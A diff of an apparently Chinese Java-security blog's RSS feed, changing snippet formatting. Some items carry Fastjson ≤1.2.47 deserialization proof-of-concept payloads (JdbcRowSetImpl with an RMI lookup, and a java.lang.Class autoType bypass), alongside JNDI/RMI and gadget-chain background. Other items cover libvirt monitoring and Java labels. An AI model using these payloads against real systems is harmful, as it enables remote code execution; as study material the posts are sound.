@@ -32,10 +32,10 @@ if (lexer.token() == JSONToken.LITERAL_STRING) { // 第二个 @type 的值 Strin
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
 Fastjson &amp;lt;= 1.2.47 POC 随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。
 我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。
-import com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;; JSON.parse(payload); } } 不出意料的话会出现这样的错误提示信息：
+import com.alibaba.fastjson.JSON;  public class Eval3 {   public static void main(String[] args) throws Exception {  String payload = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;;  JSON.parse(payload);  } } 不出意料的话会出现这样的错误提示信息：
 autoType is not support. com.sun.rowset.JdbcRowSetImpl 这是因为 fastjson 使用了黑名单机制，禁止将 com.sun.rowset.JdbcRowSetImpl 反序列化。
 下面我们使用新的 POC 进行测试，又可以利用成功了。
-import com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = &amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;; JSON.parse(payload); } } payload 格式化之后如下：</description>
+import com.alibaba.fastjson.JSON;  public class Eval5 {   public static void main(String[] args) throws Exception {  String payload = &amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.</description>
     </item>
     
     <item>
@@ -49,7 +49,7 @@ JNDI 是什么 Java命名和目录接口（Java Naming and Directory Interface�
 JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。
  轻量级目录访问协议 (LDAP) CORBA 公共对象服务命名（COS naming） Java 远程方法调用 (RMI) 域名服务 (DNS)  这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。
 使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。
-// 创建一个上下文对象 InitialContext context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup(&amp;quot;rmi://localhost:1099/Object&amp;quot;); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。
+// 创建一个上下文对象 InitialContext context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。
 RMI 有三个概念：
  Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。 Server : 远程方法的提供者。 Client : 远程方法的调用者。  远程方法的定义需要满足两个条件：</description>
     </item>
@@ -82,7 +82,7 @@ Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017
       <description>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
 新的希望 0x00 在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 commons-collections 3.1 搭配 sun.reflect.annotation.AnnotationInvocationHandler 实现远程命令执行的方式。但sun.reflect.annotation.AnnotationInvocationHandler 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 javax.management.BadAttributeValueExpException 出现在了安全人员的视野。
 javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。因此 javax.management.BadAttributeValueExpException 符合了 可序列化 这个要求，同样的它也增加了 readObject 方法，这个类的完整代码如下：
-package javax.management; import java.io.IOException; import java.io.ObjectInputStream; /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it.</description>
+package javax.management;  import java.io.IOException; import java.io.ObjectInputStream;   /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it.</description>
     </item>
     
     <item>
@@ -95,7 +95,7 @@ package javax.management; import java.io.IOException; import java.io.ObjectInput
 序列化的定义 序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。
 Java 中的序列化 Java 自身提供了序列化的功能，需要实现 java.io.Serializable 接口，标明该对象是可序列化的。 java.io.Serializable 是一个空接口，不需要对象实现方法。
 以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。
-import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval0 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } } public static void main(String[] args) throws Exception { // 定义一个对象  Command command = new Command(); command.setCmd(&amp;#34;calc&amp;#34;); System.out.println(&amp;#34;序列化前: &amp;#34; + command.</description>
+import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64;  public class Eval0 {   public static class Command implements Serializable {  private String cmd;   public String getCmd() {  return cmd;  }  public void setCmd(String cmd) {  this.cmd = cmd;  }  }   public static void main(String[] args) throws Exception {  // 定义一个对象  Command command = new Command();  command.</description>
     </item>
     
     <item>
@@ -107,7 +107,7 @@ import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Bas
       <description>虚拟化开发相较于普通开发是一个冷门的方向，大多数是使用Python开发，其中使用Java来做虚拟化的少之又少，资料更是少的可怜，为了实现需求我也是踩了不少坑，今天就为大家分享一下如何使用 libvirt-java 来采集KVM虚拟机的资源使用信息。
 CPU使用率 libvirt并没有直接提供获取虚拟机CPU使用率的接口，需要我们自己来计算，网上分享的代码或者公式五花八门，大部分都是错误的，经过我的测试，找到了一个相对准确的计算公式。
 cpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9) Java代码如下
-// t秒前的CPU时间 long c1 = domain.getInfo().cpuTime; Thread.sleep(1000); // 当前CPU时间 long c2 = domain.getInfo().cpuTime; // 虚拟CPU数量 int vCpus = domain.getMaxVcpus(); // t 为1秒 Double cpuUsage = 100 * (c2 - c1) / (1 * vCpus * Math.pow(10, 9)); log.debug(&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;, uuid, cpuUsage); 内存使用率 不要使用domain.getInfo()返回的 memory字段，虽然它注释写的是the memory in KBytes used by the domain，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和maxMem字段的值是相同的。</description>
+// t秒前的CPU时间 long c1 = domain.getInfo().cpuTime; Thread.sleep(1000); // 当前CPU时间 long c2 = domain.getInfo().cpuTime;  // 虚拟CPU数量 int vCpus = domain.getMaxVcpus(); // t 为1秒 Double cpuUsage = 100 * (c2 - c1) / (1 * vCpus * Math.pow(10, 9)); log.debug(&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;, uuid, cpuUsage); 内存使用率 不要使用domain.getInfo()返回的 memory字段，虽然它注释写的是the memory in KBytes used by the domain，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和maxMem字段的值是相同的。</description>
     </item>
     
     <item>
@@ -121,7 +121,7 @@ cpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9) Ja
 Java的保留关键字 goto和const 在Java里面没有goto这个功能，但它作为保留字是无法当做变量来使用的，const也是同样。
 int goto = 0; int const = 0; 上面这两行代码的写法存在问题，无法正常编译通过。
 Java标签Label 上面说了在Java里面没有goto这个功能，但为了处理多重循环引入了Label，目的是为了在多重循环中方便的使用 break 和coutinue ，但好像在其他地方也可以用。
-outerLoop: while (true) { System.out.println(&amp;#34;I&amp;#39;m the outer loop&amp;#34;); int i = 0; while (true) { System.out.println(&amp;#34;I am the inner loop&amp;#34;); i++; if (i &amp;gt;= 3) { break outerLoop; } } } System.out.println(&amp;#34;Complete the loop&amp;#34;); // 输出 I&amp;#39;m the outer loop I am the inner loop I am the inner loop I am the inner loop Complete the loop test: { System.</description>
+outerLoop: while (true) { 	System.out.println(&amp;#34;I&amp;#39;m the outer loop&amp;#34;); 	int i = 0; 	while (true) { 	System.out.println(&amp;#34;I am the inner loop&amp;#34;); 	i++; 	if (i &amp;gt;= 3) { 	break outerLoop; 	} 	} } System.out.println(&amp;#34;Complete the loop&amp;#34;);  // 输出 I&amp;#39;m the outer loop I am the inner loop I am the inner loop I am the inner loop Complete the loop test: { 	System.</description>
     </item>
     
   </channel>
